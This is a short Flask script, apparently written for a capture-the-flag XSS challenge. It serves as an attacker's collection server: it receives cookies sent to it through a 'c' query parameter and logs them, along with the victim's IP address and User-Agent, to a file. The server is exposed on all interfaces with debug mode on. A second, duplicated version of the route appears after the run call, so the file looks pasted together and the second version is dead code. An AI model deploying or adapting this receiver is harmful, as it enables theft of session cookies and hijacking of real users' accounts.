from flask import Flask, request
from datetime import datetime
import logging

app = Flask(__name__)

# 로그 파일 설정
logging.basicConfig(
    filename='flag_logs.txt',
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
)

@app.route('/')
def receive_flag():
    cookie = request.args.get('c')
    if cookie:
        log_msg = f"[RECEIVED COOKIE] {cookie}"
        print(log_msg)
        logging.info(log_msg)
        return '✅ Cookie received!'
    else:
        print("[NO COOKIE RECEIVED]")
        return '❌ No cookie received.'

@app.route('/health')
def health_check():
    return '✅ Server is running.'

if __name__ == '__main__':
    # 외부 접속 가능하도록 host='0.0.0.0' 사용
    app.run(host='0.0.0.0', port=8000, debug=True)

@app.route('/')
def receive_flag():
    cookie = request.args.get('c')
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")

    if cookie:
        log_msg = f"[RECEIVED] IP: {ip} | UA: {ua} | COOKIE: {cookie}"
        print(log_msg)
        logging.info(log_msg)
        return '✅ Cookie received!'
    else:
        print(f"[NO COOKIE] from {ip}")
        return '❌ No cookie received.'
